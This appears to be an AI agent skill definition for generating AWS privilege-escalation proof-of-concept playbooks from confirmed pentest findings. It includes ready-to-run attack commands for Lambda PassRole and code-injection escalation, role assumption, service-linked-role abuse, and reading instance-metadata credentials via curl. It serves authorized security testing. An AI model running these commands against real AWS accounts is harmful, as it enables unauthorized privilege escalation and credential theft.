---
name: poc-generator
description: Generates privilege escalation PoC playbooks from confirmed findings. Produces step-by-step reproduction guides with prerequisites, commands, expected output, and cleanup. Does NOT execute exploits — generates documentation only.
---

# PoC Generator

Generates proof-of-concept playbooks for confirmed privilege escalation and security findings. Produces step-by-step reproduction guides that a pentester can follow manually.

**This skill does NOT execute exploits.** It generates documentation only. All commands in the playbook are for the user to run at their discretion.

---

## Table of Contents

- [When to Trigger](#when-to-trigger)
- [Input Requirements](#input-requirements)
- [Playbook Format](#playbook-format)
- [Escalation Patterns](#escalation-patterns)
- [Output Storage](#output-storage)
- [Safety Rules](#safety-rules)

---

## When to Trigger

The Director triggers this skill when the user asks for:
- "generate a PoC", "proof of concept", "reproduction steps"
- "how would I exploit this?", "show me the attack"
- "privilege escalation test", "pentest this", "try to escalate"
- "give me playbooks for these findings"

This skill runs AFTER the pipeline has confirmed findings (Score 4-5). It consumes pipeline output — it does not run its own validation. If no confirmed escalation findings exist, run the pipeline first.

When PMapper is available (`PMAPPER_STATUS = AVAILABLE`), use its graph data to inform the playbook — PMapper's edge descriptions map directly to exploitation steps.

---

## Input Requirements

Each PoC playbook requires a confirmed finding with:

1. **Claim ID** — the validated finding (e.g., `lambda_privesc_passrole`, `iam_slr_*`)
2. **Resource ARNs** — the specific principals, roles, or resources involved
3. **Evidence** — the CLI output from the Expert that confirmed the finding
4. **Attack path** — from Exploit Chain Analysis if part of a chain

If the user asks for PoCs without running the pipeline first, run the relevant checks first to gather evidence, then generate playbooks from confirmed findings only. Never generate a PoC from an unvalidated claim.

---

## Playbook Format

Every playbook follows this exact structure:

```markdown
# PoC: {{short title}}

**Finding:** F{{N}} · {{SEVERITY}} · CONFIRMED {{score}}/5
**Claim ID:** {{claim_id}}
**Technique:** {{MITRE ATT&CK ID if applicable}}
**Risk:** {{what the attacker achieves}}

## Prerequisites

- **Current access:** {{role/user ARN the attacker starts with}}
- **Required permissions:** {{list the specific permissions needed}}
- **Target:** {{what resource/role is being escalated to}}

## Steps to Reproduce

### Step 1: {{action title}}
**Purpose:** {{why this step is needed}}
```bash
{{exact CLI command}}
```
**Expected output:**
```
{{what the output should look like}}
```

### Step 2: {{action title}}
**Purpose:** {{why this step is needed}}
```bash
{{exact CLI command}}
```
**Expected output:**
```
{{what the output should look like}}
```

### Step N: Verify Escalation
**Purpose:** Confirm privilege escalation succeeded
```bash
aws sts get-caller-identity
```
**Expected output:**
```
{{should show the escalated role/permissions}}
```

## Cleanup

**Run these commands to reverse all changes made during testing:**

```bash
{{cleanup command 1}}
{{cleanup command 2}}
```

**Verify cleanup:**
```bash
{{command to confirm resources are removed}}
```

## Evidence Chain

| Step | Source | Evidence |
|:-----|:-------|:---------|
| Confirmed | {{claim_id}} | {{one-line summary of Expert evidence}} |
| Path | {{PMapper/chain analysis}} | {{edge description or chain reference}} |
```

---

## Escalation Patterns

Reference patterns for common privilege escalation vectors. The Expert's evidence determines which pattern applies — do not guess.

### PassRole + Lambda

**Trigger:** Finding confirms `iam:PassRole` on broad scope + `lambda:CreateFunction` + `lambda:InvokeFunction`

```bash
# Step 1: Create escalation payload
cat > /tmp/poc-handler.py << 'PYEOF'
import boto3, json
def handler(event, context):
    sts = boto3.client('sts')
    identity = sts.get_caller_identity()
    return {'statusCode': 200, 'body': json.dumps(identity)}
PYEOF
cd /tmp && zip poc-function.zip poc-handler.py

# Step 2: Create Lambda with high-priv execution role
aws lambda create-function \
  --function-name poc-privesc-test \
  --runtime python3.12 \
  --handler poc-handler.handler \
  --role {{target_role_arn}} \
  --zip-file fileb:///tmp/poc-function.zip

# Step 3: Invoke to execute as target role
aws lambda invoke --function-name poc-privesc-test /tmp/poc-output.json
cat /tmp/poc-output.json

# Cleanup
aws lambda delete-function --function-name poc-privesc-test
rm /tmp/poc-handler.py /tmp/poc-function.zip /tmp/poc-output.json
```

### Lambda Code Injection

**Trigger:** Finding confirms `lambda:UpdateFunctionCode` on existing function with higher-priv execution role

```bash
# Step 1: Identify target function and its execution role
aws lambda get-function --function-name {{function_name}} \
  --query '{Role: Configuration.Role, Runtime: Configuration.Runtime}'

# Step 2: Create payload that proves execution as the function's role
cat > /tmp/poc-inject.py << 'PYEOF'
import boto3, json
def handler(event, context):
    sts = boto3.client('sts')
    return {'statusCode': 200, 'body': json.dumps(sts.get_caller_identity())}
PYEOF
cd /tmp && zip poc-inject.zip poc-inject.py

# Step 3: Overwrite function code
aws lambda update-function-code \
  --function-name {{function_name}} \
  --zip-file fileb:///tmp/poc-inject.zip

# Step 4: Invoke
aws lambda invoke --function-name {{function_name}} /tmp/poc-inject-output.json
cat /tmp/poc-inject-output.json

# Cleanup — CRITICAL: restore original code
# The original code must be saved BEFORE step 3. If not saved, flag to user.
rm /tmp/poc-inject.py /tmp/poc-inject.zip /tmp/poc-inject-output.json
```

### AssumeRole (Cross-Account or Missing MFA)

**Trigger:** Finding confirms role trust policy allows assume without MFA or from external account

```bash
# Step 1: Attempt to assume the target role
aws sts assume-role \
  --role-arn {{target_role_arn}} \
  --role-session-name poc-test

# Step 2: Use returned credentials
export AWS_ACCESS_KEY_ID={{from step 1}}
export AWS_SECRET_ACCESS_KEY={{from step 1}}
export AWS_SESSION_TOKEN={{from step 1}}

# Step 3: Verify escalation
aws sts get-caller-identity

# Cleanup — just unset the env vars
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

### SLR Abuse (Indirect Escalation)

**Trigger:** Finding confirms `iam:CreateServiceLinkedRole` with wildcard + target service API access

```bash
# Step 1: Create the service-linked role
aws iam create-service-linked-role --aws-service-name {{service}}.amazonaws.com

# Step 2: Use the service API to trigger the SLR's permissions
# (service-specific — see skills/iam/SKILL.md → SLR Security for per-service steps)

# Cleanup
aws iam delete-service-linked-role --role-name AWSServiceRoleFor{{Service}}
```

### EC2 Instance Profile Pivot

**Trigger:** Finding confirms instance role has PassRole or broad permissions

```bash
# Step 1: Confirm the instance and its role
aws ec2 describe-instances --instance-ids {{instance_id}} \
  --query 'Reservations[].Instances[].IamInstanceProfile.Arn'

# Step 2: Access the instance (SSM or SSH)
aws ssm start-session --target {{instance_id}}

# Step 3: From inside the instance, query the metadata service
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{{role_name}}

# Step 4: Use the credentials to verify access
aws sts get-caller-identity

# Cleanup — no persistent changes, just exit the session
```

---

## Output Storage

Playbooks are saved to `data/poc-generator/playbooks/` using the standard naming convention:

```
data/poc-generator/playbooks/
└── {account_id}-{date}-{finding}.md
```

Example: `123456789012-2026-03-24-lambda-privesc-passrole.md`

### Saving

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
TODAY=$(date +%Y-%m-%d)
# Save each playbook as a separate file
# data/poc-generator/playbooks/${ACCOUNT_ID}-${TODAY}-${claim_id}.md
```

---

## Safety Rules

1. **Never execute exploitation commands** — this skill generates documentation only. The user decides what to run.
2. **Only generate from confirmed findings** — Score 4-5 with deterministic CLI evidence. Never from speculation.
3. **Always include cleanup steps** — every playbook MUST have a Cleanup section that reverses all changes.
4. **Warn about destructive steps** — if a step modifies production resources (e.g., `lambda:UpdateFunctionCode` on an existing function), add a `⚠ WARNING: This modifies a live resource. Save the original state first.` note before the step.
5. **Include prerequisites** — the playbook must state exactly what access level is needed to start. Don't assume the reader has context.
6. **No credential exfiltration** — playbooks prove escalation via `sts:get-caller-identity`, not by extracting or storing credentials.
7. **Scope to the finding** — don't add extra exploitation steps beyond what the finding enables. The PoC proves the specific vulnerability, nothing more.
